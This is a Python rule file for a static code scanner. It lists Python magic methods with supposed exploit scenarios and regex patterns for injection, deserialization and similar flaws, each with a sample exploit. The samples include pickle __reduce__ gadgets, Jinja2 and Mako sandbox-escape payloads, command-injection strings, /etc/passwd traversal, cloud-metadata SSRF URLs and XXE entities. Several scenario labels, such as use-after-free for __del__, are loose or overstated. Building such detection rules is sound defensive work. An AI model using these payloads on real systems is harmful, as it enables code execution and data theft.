"""
Python SAST Patterns - Complete Magic Methods and Exploitation Patterns
"""

# ============================================================================
# PYTHON MAGIC METHODS - COMPLETE LIST (DUNDER METHODS)
# ============================================================================
PYTHON_MAGIC_METHODS = {
    'name': 'Python Magic Methods (Dunder)',
    'description': 'All Python magic methods that can be abused for exploitation',
    'methods': {
        # OBJECT CREATION & DESTRUCTION
        '__new__': {
            'trigger': 'Called before __init__ to create instance',
            'exploit_scenarios': [
                'Object injection via deserialization',
                'Singleton bypass attacks',
                'Instance manipulation',
            ],
            'dangerous_with': ['pickle', 'marshal', 'shelve'],
        },
        '__init__': {
            'trigger': 'Object initialization',
            'exploit_scenarios': [
                'Pickle deserialization RCE',
                'Arbitrary attribute injection',
                'Resource exhaustion via init',
            ],
            'dangerous_with': ['os.system', 'subprocess', 'eval', 'exec'],
        },
        '__del__': {
            'trigger': 'Object destruction, garbage collection',
            'exploit_scenarios': [
                'Use-after-free scenarios',
                'File/resource cleanup exploitation',
                'Destructor chain attacks',
            ],
            'dangerous_with': ['os.remove', 'shutil.rmtree', 'subprocess'],
        },
        '__init_subclass__': {
            'trigger': 'When a class is subclassed',
            'exploit_scenarios': [
                'Class hierarchy manipulation',
                'Subclass injection attacks',
            ],
            'dangerous_with': [],
        },
        
        # ATTRIBUTE ACCESS
        '__getattr__': {
            'trigger': 'Accessing undefined attribute',
            'exploit_scenarios': [
                'Attribute injection attacks',
                'Dynamic code execution via attribute',
                'Prototype pollution equivalent',
            ],
            'dangerous_with': ['eval', 'exec', 'getattr'],
        },
        '__setattr__': {
            'trigger': 'Setting any attribute',
            'exploit_scenarios': [
                'Object state manipulation',
                'Security bypass via attribute override',
                'Method replacement',
            ],
            'dangerous_with': ['setattr'],
        },
        '__delattr__': {
            'trigger': 'Deleting attribute via del',
            'exploit_scenarios': [
                'Security mechanism bypass',
                'State corruption',
            ],
            'dangerous_with': [],
        },
        '__getattribute__': {
            'trigger': 'Every attribute access',
            'exploit_scenarios': [
                'Attribute access interception',
                'Logging/auditing bypass',
            ],
            'dangerous_with': [],
        },
        '__dir__': {
            'trigger': 'dir() call on object',
            'exploit_scenarios': [
                'Information hiding/disclosure',
            ],
            'dangerous_with': [],
        },
        
        # DESCRIPTORS
        '__get__': {
            'trigger': 'Descriptor attribute access',
            'exploit_scenarios': [
                'Descriptor injection',
                'Property manipulation',
            ],
            'dangerous_with': [],
        },
        '__set__': {
            'trigger': 'Descriptor attribute set',
            'exploit_scenarios': [
                'Descriptor state manipulation',
            ],
            'dangerous_with': [],
        },
        '__delete__': {
            'trigger': 'Descriptor attribute delete',
            'exploit_scenarios': [
                'Descriptor cleanup exploitation',
            ],
            'dangerous_with': [],
        },
        '__set_name__': {
            'trigger': 'Descriptor assigned to class attribute',
            'exploit_scenarios': [
                'Class attribute injection',
            ],
            'dangerous_with': [],
        },
        
        # CALLABLE
        '__call__': {
            'trigger': 'Object called as function',
            'exploit_scenarios': [
                'Callable injection',
                'Callback manipulation',
                'RCE via callable object',
            ],
            'dangerous_with': ['eval', 'exec', 'os.system', 'subprocess'],
        },
        
        # REPRESENTATION
        '__repr__': {
            'trigger': 'repr() call, debugging',
            'exploit_scenarios': [
                'Information disclosure',
                'Format string via repr',
            ],
            'dangerous_with': [],
        },
        '__str__': {
            'trigger': 'str() call, print',
            'exploit_scenarios': [
                'String conversion exploitation',
                'Format string attacks',
            ],
            'dangerous_with': [],
        },
        '__bytes__': {
            'trigger': 'bytes() call',
            'exploit_scenarios': [
                'Binary data manipulation',
            ],
            'dangerous_with': [],
        },
        '__format__': {
            'trigger': 'format(), f-strings',
            'exploit_scenarios': [
                'Format string vulnerabilities',
                'Information disclosure via format spec',
            ],
            'dangerous_with': [],
        },
        
        # COMPARISON
        '__lt__': {'trigger': '<', 'exploit_scenarios': ['Comparison manipulation'], 'dangerous_with': []},
        '__le__': {'trigger': '<=', 'exploit_scenarios': ['Comparison manipulation'], 'dangerous_with': []},
        '__eq__': {'trigger': '==', 'exploit_scenarios': ['Equality bypass', 'Type confusion'], 'dangerous_with': []},
        '__ne__': {'trigger': '!=', 'exploit_scenarios': ['Inequality bypass'], 'dangerous_with': []},
        '__gt__': {'trigger': '>', 'exploit_scenarios': ['Comparison manipulation'], 'dangerous_with': []},
        '__ge__': {'trigger': '>=', 'exploit_scenarios': ['Comparison manipulation'], 'dangerous_with': []},
        '__hash__': {'trigger': 'hash(), dict key', 'exploit_scenarios': ['Hash collision DoS'], 'dangerous_with': []},
        '__bool__': {'trigger': 'bool(), if statement', 'exploit_scenarios': ['Boolean bypass'], 'dangerous_with': []},
        
        # CONTAINER METHODS
        '__len__': {
            'trigger': 'len() call',
            'exploit_scenarios': [
                'Length manipulation',
                'Boundary check bypass',
            ],
            'dangerous_with': [],
        },
        '__getitem__': {
            'trigger': 'obj[key] access',
            'exploit_scenarios': [
                'Index/key injection',
                'Data access manipulation',
            ],
            'dangerous_with': ['eval', 'exec'],
        },
        '__setitem__': {
            'trigger': 'obj[key] = value',
            'exploit_scenarios': [
                'Data injection',
                'State manipulation',
            ],
            'dangerous_with': [],
        },
        '__delitem__': {
            'trigger': 'del obj[key]',
            'exploit_scenarios': [
                'Data deletion attacks',
            ],
            'dangerous_with': [],
        },
        '__contains__': {
            'trigger': 'in operator',
            'exploit_scenarios': [
                'Membership check bypass',
            ],
            'dangerous_with': [],
        },
        '__iter__': {
            'trigger': 'Iteration',
            'exploit_scenarios': [
                'Iterator manipulation',
                'Infinite loop DoS',
            ],
            'dangerous_with': [],
        },
        '__next__': {
            'trigger': 'next() call',
            'exploit_scenarios': [
                'Iterator exhaustion',
            ],
            'dangerous_with': [],
        },
        '__reversed__': {
            'trigger': 'reversed() call',
            'exploit_scenarios': [
                'Reverse iteration manipulation',
            ],
            'dangerous_with': [],
        },
        
        # NUMERIC OPERATIONS
        '__add__': {'trigger': '+', 'exploit_scenarios': ['Numeric overflow'], 'dangerous_with': []},
        '__sub__': {'trigger': '-', 'exploit_scenarios': ['Numeric underflow'], 'dangerous_with': []},
        '__mul__': {'trigger': '*', 'exploit_scenarios': ['Memory exhaustion via multiplication'], 'dangerous_with': []},
        '__matmul__': {'trigger': '@', 'exploit_scenarios': [], 'dangerous_with': []},
        '__truediv__': {'trigger': '/', 'exploit_scenarios': ['Division by zero'], 'dangerous_with': []},
        '__floordiv__': {'trigger': '//', 'exploit_scenarios': ['Division by zero'], 'dangerous_with': []},
        '__mod__': {'trigger': '%', 'exploit_scenarios': ['Modulo by zero'], 'dangerous_with': []},
        '__divmod__': {'trigger': 'divmod()', 'exploit_scenarios': [], 'dangerous_with': []},
        '__pow__': {'trigger': '**', 'exploit_scenarios': ['Resource exhaustion'], 'dangerous_with': []},
        '__lshift__': {'trigger': '<<', 'exploit_scenarios': ['Integer overflow'], 'dangerous_with': []},
        '__rshift__': {'trigger': '>>', 'exploit_scenarios': [], 'dangerous_with': []},
        '__and__': {'trigger': '&', 'exploit_scenarios': [], 'dangerous_with': []},
        '__xor__': {'trigger': '^', 'exploit_scenarios': [], 'dangerous_with': []},
        '__or__': {'trigger': '|', 'exploit_scenarios': [], 'dangerous_with': []},
        
        # REFLECTED OPERATIONS (r prefix)
        '__radd__': {'trigger': '+ (reflected)', 'exploit_scenarios': [], 'dangerous_with': []},
        '__rsub__': {'trigger': '- (reflected)', 'exploit_scenarios': [], 'dangerous_with': []},
        '__rmul__': {'trigger': '* (reflected)', 'exploit_scenarios': [], 'dangerous_with': []},
        
        # AUGMENTED ASSIGNMENT (i prefix)
        '__iadd__': {'trigger': '+=', 'exploit_scenarios': [], 'dangerous_with': []},
        '__isub__': {'trigger': '-=', 'exploit_scenarios': [], 'dangerous_with': []},
        '__imul__': {'trigger': '*=', 'exploit_scenarios': [], 'dangerous_with': []},
        
        # UNARY OPERATIONS
        '__neg__': {'trigger': '-obj', 'exploit_scenarios': [], 'dangerous_with': []},
        '__pos__': {'trigger': '+obj', 'exploit_scenarios': [], 'dangerous_with': []},
        '__abs__': {'trigger': 'abs()', 'exploit_scenarios': [], 'dangerous_with': []},
        '__invert__': {'trigger': '~obj', 'exploit_scenarios': [], 'dangerous_with': []},
        '__complex__': {'trigger': 'complex()', 'exploit_scenarios': [], 'dangerous_with': []},
        '__int__': {'trigger': 'int()', 'exploit_scenarios': ['Type coercion bypass'], 'dangerous_with': []},
        '__float__': {'trigger': 'float()', 'exploit_scenarios': ['Type coercion bypass'], 'dangerous_with': []},
        '__index__': {'trigger': 'Index conversion', 'exploit_scenarios': ['Index manipulation'], 'dangerous_with': []},
        '__round__': {'trigger': 'round()', 'exploit_scenarios': [], 'dangerous_with': []},
        '__trunc__': {'trigger': 'math.trunc()', 'exploit_scenarios': [], 'dangerous_with': []},
        '__floor__': {'trigger': 'math.floor()', 'exploit_scenarios': [], 'dangerous_with': []},
        '__ceil__': {'trigger': 'math.ceil()', 'exploit_scenarios': [], 'dangerous_with': []},
        
        # CONTEXT MANAGERS
        '__enter__': {
            'trigger': 'with statement enter',
            'exploit_scenarios': [
                'Context setup exploitation',
                'Resource acquisition attacks',
            ],
            'dangerous_with': ['open', 'connect'],
        },
        '__exit__': {
            'trigger': 'with statement exit',
            'exploit_scenarios': [
                'Exception handling bypass',
                'Resource cleanup exploitation',
            ],
            'dangerous_with': [],
        },
        '__aenter__': {
            'trigger': 'async with enter',
            'exploit_scenarios': ['Async context attacks'],
            'dangerous_with': [],
        },
        '__aexit__': {
            'trigger': 'async with exit',
            'exploit_scenarios': ['Async cleanup attacks'],
            'dangerous_with': [],
        },
        
        # ASYNC ITERATION
        '__aiter__': {'trigger': 'async for', 'exploit_scenarios': [], 'dangerous_with': []},
        '__anext__': {'trigger': 'async next()', 'exploit_scenarios': [], 'dangerous_with': []},
        
        # AWAIT
        '__await__': {
            'trigger': 'await expression',
            'exploit_scenarios': [
                'Async flow manipulation',
            ],
            'dangerous_with': [],
        },
        
        # PICKLING - CRITICAL FOR RCE
        '__reduce__': {
            'trigger': 'pickle.dumps()',
            'exploit_scenarios': [
                'ARBITRARY CODE EXECUTION',
                'Return (os.system, ("command",))',
                'Most dangerous pickle method',
            ],
            'dangerous_with': ['os.system', 'subprocess.call', 'eval', 'exec'],
        },
        '__reduce_ex__': {
            'trigger': 'pickle.dumps() with protocol',
            'exploit_scenarios': [
                'Same as __reduce__',
                'Protocol-specific attacks',
            ],
            'dangerous_with': ['os.system', 'subprocess.call', 'eval', 'exec'],
        },
        '__getstate__': {
            'trigger': 'pickle.dumps() for state',
            'exploit_scenarios': [
                'State manipulation',
                'Information disclosure',
            ],
            'dangerous_with': [],
        },
        '__setstate__': {
            'trigger': 'pickle.loads() restore state',
            'exploit_scenarios': [
                'State injection attacks',
                'Attribute manipulation',
            ],
            'dangerous_with': ['eval', 'exec'],
        },
        '__getnewargs__': {
            'trigger': 'pickle - get args for __new__',
            'exploit_scenarios': [
                'Constructor argument injection',
            ],
            'dangerous_with': [],
        },
        '__getnewargs_ex__': {
            'trigger': 'pickle - get args/kwargs',
            'exploit_scenarios': [
                'Constructor manipulation',
            ],
            'dangerous_with': [],
        },
        
        # COPY
        '__copy__': {
            'trigger': 'copy.copy()',
            'exploit_scenarios': [
                'Shallow copy manipulation',
            ],
            'dangerous_with': [],
        },
        '__deepcopy__': {
            'trigger': 'copy.deepcopy()',
            'exploit_scenarios': [
                'Deep copy exploitation',
            ],
            'dangerous_with': [],
        },
        
        # CLASS CREATION
        '__prepare__': {
            'trigger': 'Class namespace preparation',
            'exploit_scenarios': [
                'Metaclass attacks',
            ],
            'dangerous_with': [],
        },
        '__class_getitem__': {
            'trigger': 'Class[item] subscription',
            'exploit_scenarios': [
                'Generic type attacks',
            ],
            'dangerous_with': [],
        },
        '__mro_entries__': {
            'trigger': 'MRO resolution',
            'exploit_scenarios': [
                'Inheritance manipulation',
            ],
            'dangerous_with': [],
        },
        
        # SLOTS
        '__slots__': {
            'trigger': 'Class attribute definition',
            'exploit_scenarios': [
                'Memory layout attacks',
            ],
            'dangerous_with': [],
        },
        
        # INSTANCE/SUBCLASS CHECKS
        '__instancecheck__': {
            'trigger': 'isinstance()',
            'exploit_scenarios': [
                'Type check bypass',
            ],
            'dangerous_with': [],
        },
        '__subclasscheck__': {
            'trigger': 'issubclass()',
            'exploit_scenarios': [
                'Inheritance check bypass',
            ],
            'dangerous_with': [],
        },
        
        # ANNOTATIONS
        '__class__': {
            'trigger': 'obj.__class__ access',
            'exploit_scenarios': [
                'Class attribute access for sandbox escape',
                'CRITICAL: Used in SSTI bypasses',
            ],
            'dangerous_with': ['__mro__', '__base__', '__subclasses__'],
        },
        '__bases__': {
            'trigger': 'Class bases access',
            'exploit_scenarios': [
                'Sandbox escape via base classes',
            ],
            'dangerous_with': [],
        },
        '__subclasses__': {
            'trigger': 'Get all subclasses',
            'exploit_scenarios': [
                'CRITICAL: Sandbox escape',
                'Find useful gadget classes',
            ],
            'dangerous_with': ['os._wrap_close', 'subprocess.Popen'],
        },
        '__mro__': {
            'trigger': 'Method Resolution Order',
            'exploit_scenarios': [
                'Walk up inheritance chain',
            ],
            'dangerous_with': [],
        },
        '__globals__': {
            'trigger': 'Function global namespace',
            'exploit_scenarios': [
                'CRITICAL: Access to all globals',
                'Sandbox escape',
            ],
            'dangerous_with': ['__builtins__'],
        },
        '__builtins__': {
            'trigger': 'Built-in functions namespace',
            'exploit_scenarios': [
                'CRITICAL: Access to __import__, eval, exec',
                'Sandbox escape',
            ],
            'dangerous_with': ['__import__', 'eval', 'exec', 'open'],
        },
        '__code__': {
            'trigger': 'Function code object',
            'exploit_scenarios': [
                'Code object manipulation',
                'Bytecode injection',
            ],
            'dangerous_with': [],
        },
        '__closure__': {
            'trigger': 'Function closure',
            'exploit_scenarios': [
                'Closure variable access',
            ],
            'dangerous_with': [],
        },
        
        # SPECIAL MODULE ATTRIBUTES
        '__file__': {
            'trigger': 'Module file path',
            'exploit_scenarios': [
                'Path disclosure',
            ],
            'dangerous_with': [],
        },
        '__name__': {
            'trigger': 'Module/class name',
            'exploit_scenarios': [
                'Name-based logic bypass',
            ],
            'dangerous_with': [],
        },
        '__doc__': {
            'trigger': 'Docstring access',
            'exploit_scenarios': [
                'Information disclosure',
            ],
            'dangerous_with': [],
        },
        '__dict__': {
            'trigger': 'Object attribute dictionary',
            'exploit_scenarios': [
                'Direct attribute manipulation',
                'State injection',
            ],
            'dangerous_with': [],
        },
        '__module__': {
            'trigger': 'Module reference',
            'exploit_scenarios': [
                'Module import manipulation',
            ],
            'dangerous_with': [],
        },
        '__annotations__': {
            'trigger': 'Type annotations dict',
            'exploit_scenarios': [
                'Annotation injection',
            ],
            'dangerous_with': [],
        },
    },
    
    # PICKLE GADGET CHAINS
    'pickle_gadgets': {
        'os_system': 'Return (os.system, ("command",))',
        'subprocess': 'Return (subprocess.Popen, (["cmd"],))',
        'eval': 'Return (eval, ("__import__(\'os\').system(\'id\')",))',
        'exec': 'Return (exec, ("import os; os.system(\'id\')",))',
        'builtins_exec': 'Return (builtins.exec, (code,))',
    },
    
    # SSTI SANDBOX ESCAPE CHAINS
    'ssti_escape_chains': {
        'jinja2': [
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{request.__class__.__mro__[2].__subclasses__()[N].__init__.__globals__['os'].popen('id').read()}}",
        ],
        'mako': [
            "${self.module.cache.util.os.popen('id').read()}",
            "<%import os%>${os.popen('id').read()}",
        ],
        'tornado': [
            "{{handler.settings}}",
        ],
    },
}

# ============================================================================
# PYTHON VULNERABILITY PATTERNS
# ============================================================================
PYTHON_PATTERNS = [
    # ----- REMOTE CODE EXECUTION -----
    {
        'id': 'py_rce_eval',
        'name': 'Python eval() RCE',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'eval\s*\([^)]*(?:request|input|args|params|data|user|query)',
        'description': 'Code execution via eval()',
        'exploit': '__import__("os").system("id")',
        'cwe': 'CWE-94',
    },
    {
        'id': 'py_rce_exec',
        'name': 'Python exec() RCE',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'exec\s*\([^)]*(?:request|input|args|params|data|user|query)',
        'description': 'Code execution via exec()',
        'exploit': 'exec("import os; os.system(\'id\')")',
        'cwe': 'CWE-94',
    },
    {
        'id': 'py_rce_compile',
        'name': 'Python compile() RCE',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'compile\s*\([^)]*(?:request|input|args|params|data|user)',
        'description': 'Code execution via compile()',
        'exploit': 'compile(code, "<string>", "exec")',
        'cwe': 'CWE-94',
    },
    {
        'id': 'py_rce_importlib',
        'name': 'Python Dynamic Import RCE',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'(__import__|importlib\.import_module)\s*\([^)]*(?:request|input|args|params)',
        'description': 'RCE via dynamic import',
        'exploit': '__import__("os").system("id")',
        'cwe': 'CWE-94',
    },
    {
        'id': 'py_rce_getattr',
        'name': 'Python getattr() RCE Chain',
        'category': 'rce',
        'severity': 'high',
        'pattern': r'getattr\s*\([^)]*(?:request|input|args|params)',
        'description': 'RCE chain via getattr()',
        'exploit': 'getattr(obj, user_input)()',
        'cwe': 'CWE-94',
    },
    
    # ----- DESERIALIZATION -----
    {
        'id': 'py_deser_pickle',
        'name': 'Python Pickle Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'pickle\.(loads?|Unpickler)\s*\(',
        'description': 'Insecure deserialization via pickle',
        'exploit': 'class Exploit: def __reduce__(self): return (os.system, ("id",))',
        'cwe': 'CWE-502',
    },
    {
        'id': 'py_deser_cpickle',
        'name': 'Python cPickle Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'cPickle\.(loads?|Unpickler)\s*\(',
        'description': 'Insecure deserialization via cPickle',
        'exploit': 'Same as pickle',
        'cwe': 'CWE-502',
    },
    {
        'id': 'py_deser_marshal',
        'name': 'Python Marshal Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'marshal\.loads?\s*\(',
        'description': 'Insecure deserialization via marshal',
        'exploit': 'Malicious code object',
        'cwe': 'CWE-502',
    },
    {
        'id': 'py_deser_shelve',
        'name': 'Python Shelve Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'shelve\.open\s*\(',
        'description': 'Insecure deserialization via shelve (uses pickle)',
        'exploit': 'Same as pickle',
        'cwe': 'CWE-502',
    },
    {
        'id': 'py_deser_yaml',
        'name': 'Python YAML Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'yaml\.(load|unsafe_load|full_load)\s*\([^)]*(?!Loader\s*=\s*yaml\.SafeLoader)',
        'description': 'Insecure YAML deserialization',
        'exploit': '!!python/object/apply:os.system ["id"]',
        'cwe': 'CWE-502',
    },
    {
        'id': 'py_deser_jsonpickle',
        'name': 'Python jsonpickle Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'jsonpickle\.decode\s*\(',
        'description': 'Insecure deserialization via jsonpickle',
        'exploit': '{"py/object": "os.system", "args": ["id"]}',
        'cwe': 'CWE-502',
    },
    {
        'id': 'py_deser_dill',
        'name': 'Python Dill Deserialization',
        'category': 'deserialization',
        'severity': 'critical',
        'pattern': r'dill\.loads?\s*\(',
        'description': 'Insecure deserialization via dill',
        'exploit': 'Same as pickle',
        'cwe': 'CWE-502',
    },
    
    # ----- COMMAND INJECTION -----
    {
        'id': 'py_cmdi_os_system',
        'name': 'Python os.system() Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'os\.system\s*\([^)]*(?:request|input|args|params|data|user|\+)',
        'description': 'OS command execution via os.system()',
        'exploit': '; id #',
        'cwe': 'CWE-78',
    },
    {
        'id': 'py_cmdi_os_popen',
        'name': 'Python os.popen() Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'os\.popen\s*\([^)]*(?:request|input|args|params|data|user|\+)',
        'description': 'OS command execution via os.popen()',
        'exploit': '| cat /etc/passwd',
        'cwe': 'CWE-78',
    },
    {
        'id': 'py_cmdi_subprocess_shell',
        'name': 'Python subprocess with shell=True',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'subprocess\.(call|run|Popen|check_output|check_call)\s*\([^)]*shell\s*=\s*True',
        'description': 'Command injection via subprocess with shell=True',
        'exploit': '; id; #',
        'cwe': 'CWE-78',
    },
    {
        'id': 'py_cmdi_commands',
        'name': 'Python commands Module (deprecated)',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'commands\.(getoutput|getstatusoutput)\s*\(',
        'description': 'Command execution via deprecated commands module',
        'exploit': '; id',
        'cwe': 'CWE-78',
    },
    {
        'id': 'py_cmdi_pty_spawn',
        'name': 'Python pty.spawn() Command Injection',
        'category': 'command_injection',
        'severity': 'critical',
        'pattern': r'pty\.spawn\s*\([^)]*(?:request|input|args)',
        'description': 'Command execution via pty.spawn()',
        'exploit': 'pty.spawn("/bin/sh")',
        'cwe': 'CWE-78',
    },
    
    # ----- SQL INJECTION -----
    {
        'id': 'py_sqli_string_format',
        'name': 'Python SQL Injection (String Format)',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'execute\s*\([^)]*(%|\.format|f[\'"])',
        'description': 'SQL injection via string formatting',
        'exploit': '\' OR 1=1--',
        'cwe': 'CWE-89',
    },
    {
        'id': 'py_sqli_concat',
        'name': 'Python SQL Injection (Concatenation)',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'execute\s*\([^)]*\+[^)]*(?:request|input|args|params)',
        'description': 'SQL injection via string concatenation',
        'exploit': '\'; DROP TABLE users;--',
        'cwe': 'CWE-89',
    },
    {
        'id': 'py_sqli_raw',
        'name': 'Python ORM Raw Query',
        'category': 'sqli',
        'severity': 'high',
        'pattern': r'(raw|extra|RawSQL)\s*\([^)]*(?:request|input|args|params)',
        'description': 'SQL injection via ORM raw query',
        'exploit': 'SQLi in raw query',
        'cwe': 'CWE-89',
    },
    
    # ----- SSTI (Server-Side Template Injection) -----
    {
        'id': 'py_ssti_jinja2',
        'name': 'Python Jinja2 SSTI',
        'category': 'ssti',
        'severity': 'critical',
        'pattern': r'(Template|render_template_string)\s*\([^)]*(?:request|input|args|params)',
        'description': 'SSTI via Jinja2 template',
        'exploit': '{{config.__class__.__init__.__globals__[\'os\'].popen(\'id\').read()}}',
        'cwe': 'CWE-94',
    },
    {
        'id': 'py_ssti_mako',
        'name': 'Python Mako SSTI',
        'category': 'ssti',
        'severity': 'critical',
        'pattern': r'mako\.(Template|template\.Template)\s*\([^)]*(?:request|input|args)',
        'description': 'SSTI via Mako template',
        'exploit': '${self.module.cache.util.os.popen(\'id\').read()}',
        'cwe': 'CWE-94',
    },
    {
        'id': 'py_ssti_tornado',
        'name': 'Python Tornado SSTI',
        'category': 'ssti',
        'severity': 'critical',
        'pattern': r'tornado\.template\.Template\s*\([^)]*(?:request|input|args)',
        'description': 'SSTI via Tornado template',
        'exploit': '{{handler.settings}}',
        'cwe': 'CWE-94',
    },
    
    # ----- PATH TRAVERSAL -----
    {
        'id': 'py_path_traversal_open',
        'name': 'Python Path Traversal (open)',
        'category': 'path_traversal',
        'severity': 'high',
        'pattern': r'open\s*\([^)]*(?:request|input|args|params|\.\.)',
        'description': 'Path traversal via open()',
        'exploit': '../../../etc/passwd',
        'cwe': 'CWE-22',
    },
    {
        'id': 'py_path_traversal_send',
        'name': 'Python Path Traversal (send_file)',
        'category': 'path_traversal',
        'severity': 'high',
        'pattern': r'send_file\s*\([^)]*(?:request|input|args|params)',
        'description': 'Path traversal via send_file()',
        'exploit': '../../../etc/passwd',
        'cwe': 'CWE-22',
    },
    
    # ----- SSRF -----
    {
        'id': 'py_ssrf_requests',
        'name': 'Python SSRF (requests)',
        'category': 'ssrf',
        'severity': 'high',
        'pattern': r'requests\.(get|post|put|delete|patch|head|options)\s*\([^)]*(?:request|input|args|params)',
        'description': 'SSRF via requests library',
        'exploit': 'http://169.254.169.254/latest/meta-data/',
        'cwe': 'CWE-918',
    },
    {
        'id': 'py_ssrf_urllib',
        'name': 'Python SSRF (urllib)',
        'category': 'ssrf',
        'severity': 'high',
        'pattern': r'urllib\.(request\.)?urlopen\s*\([^)]*(?:request|input|args|params)',
        'description': 'SSRF via urllib',
        'exploit': 'file:///etc/passwd',
        'cwe': 'CWE-918',
    },
    
    # ----- XXE -----
    {
        'id': 'py_xxe_etree',
        'name': 'Python XXE (ElementTree)',
        'category': 'xxe',
        'severity': 'high',
        'pattern': r'(xml\.etree|lxml\.etree)\.parse\s*\(',
        'description': 'XXE via ElementTree/lxml',
        'exploit': '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        'cwe': 'CWE-611',
    },
    {
        'id': 'py_xxe_xmlrpc',
        'name': 'Python XXE (xmlrpc)',
        'category': 'xxe',
        'severity': 'high',
        'pattern': r'xmlrpc\.(client|server)',
        'description': 'XXE via xmlrpc',
        'exploit': 'XML external entity in RPC',
        'cwe': 'CWE-611',
    },
    
    # ----- HARDCODED SECRETS -----
    {
        'id': 'py_secrets_password',
        'name': 'Python Hardcoded Password',
        'category': 'secrets',
        'severity': 'high',
        'pattern': r'(password|passwd|pwd|secret|api_key|apikey|token)\s*=\s*[\'"][^\'"]{8,}[\'"]',
        'description': 'Hardcoded password/secret',
        'exploit': 'Credential theft',
        'cwe': 'CWE-798',
    },
    
    # ----- DANGEROUS FUNCTIONS -----
    {
        'id': 'py_dangerous_input',
        'name': 'Python input() (Python 2)',
        'category': 'rce',
        'severity': 'critical',
        'pattern': r'(?<!raw_)input\s*\(',
        'description': 'input() in Python 2 executes code',
        'exploit': '__import__("os").system("id")',
        'cwe': 'CWE-94',
    },
    
    # ----- CRYPTO ISSUES -----
    {
        'id': 'py_weak_crypto_md5',
        'name': 'Python Weak Hash (MD5)',
        'category': 'crypto',
        'severity': 'medium',
        'pattern': r'(md5|hashlib\.md5)\s*\(',
        'description': 'Weak MD5 hashing',
        'exploit': 'Hash collision',
        'cwe': 'CWE-328',
    },
    {
        'id': 'py_weak_crypto_sha1',
        'name': 'Python Weak Hash (SHA1)',
        'category': 'crypto',
        'severity': 'medium',
        'pattern': r'(sha1|hashlib\.sha1)\s*\(',
        'description': 'Weak SHA1 hashing',
        'exploit': 'Hash collision',
        'cwe': 'CWE-328',
    },
    {
        'id': 'py_weak_random',
        'name': 'Python Weak Random',
        'category': 'crypto',
        'severity': 'medium',
        'pattern': r'random\.(random|randint|choice|shuffle)\s*\(',
        'description': 'Predictable random (not cryptographic)',
        'exploit': 'Predict random values',
        'cwe': 'CWE-330',
    },
    
    # ----- DEBUG/INFO DISCLOSURE -----
    {
        'id': 'py_debug_mode',
        'name': 'Python Debug Mode',
        'category': 'info_disclosure',
        'severity': 'medium',
        'pattern': r'(DEBUG\s*=\s*True|\.run\s*\([^)]*debug\s*=\s*True)',
        'description': 'Debug mode enabled',
        'exploit': 'Information disclosure',
        'cwe': 'CWE-200',
    },
    
    # ----- FLASK SPECIFIC -----
    {
        'id': 'py_flask_secret_key',
        'name': 'Flask Weak Secret Key',
        'category': 'secrets',
        'severity': 'high',
        'pattern': r'SECRET_KEY\s*=\s*[\'"][^\'"]{0,20}[\'"]',
        'description': 'Flask weak/short secret key',
        'exploit': 'Session forgery',
        'cwe': 'CWE-798',
    },
    
    # ----- DJANGO SPECIFIC -----
    {
        'id': 'py_django_debug',
        'name': 'Django DEBUG=True',
        'category': 'info_disclosure',
        'severity': 'high',
        'pattern': r'DEBUG\s*=\s*True',
        'description': 'Django debug mode in production',
        'exploit': 'Stack traces, settings disclosure',
        'cwe': 'CWE-200',
    },
    
    # ----- ASSERT IN PRODUCTION -----
    {
        'id': 'py_assert_auth',
        'name': 'Python Assert for Auth',
        'category': 'auth_bypass',
        'severity': 'high',
        'pattern': r'assert\s+.*(?:auth|admin|user|login|permission)',
        'description': 'Assert used for authentication (disabled with -O)',
        'exploit': 'Run with python -O to bypass',
        'cwe': 'CWE-617',
    },
    
    # ----- FORMAT STRING -----
    {
        'id': 'py_format_string',
        'name': 'Python Format String',
        'category': 'format_string',
        'severity': 'medium',
        'pattern': r'\.format\s*\([^)]*(?:request|input|args|params)',
        'description': 'Format string vulnerability',
        'exploit': '{0.__class__.__mro__[2].__subclasses__()}',
        'cwe': 'CWE-134',
    },
    
    # ----- PROTOTYPE POLLUTION EQUIVALENT -----
    {
        'id': 'py_class_pollution',
        'name': 'Python Class Attribute Pollution',
        'category': 'class_pollution',
        'severity': 'high',
        'pattern': r'setattr\s*\([^)]*(?:request|input|args|params)',
        'description': 'Class attribute pollution via setattr',
        'exploit': 'setattr(obj, "__class__", ...)',
        'cwe': 'CWE-915',
    },
]
